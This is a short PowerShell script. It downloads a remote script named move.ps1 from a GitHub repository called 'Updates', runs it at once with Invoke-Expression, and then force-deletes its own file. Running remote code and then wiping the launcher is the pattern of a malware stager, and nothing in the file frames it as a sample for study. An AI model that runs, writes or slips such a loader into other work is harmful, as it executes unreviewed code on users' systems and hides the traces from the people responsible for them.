Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/move.ps1" -UseBasicParsing).Content

$scriptPath = $MyInvocation.MyCommand.Path

Remove-Item -Path $scriptPath -Force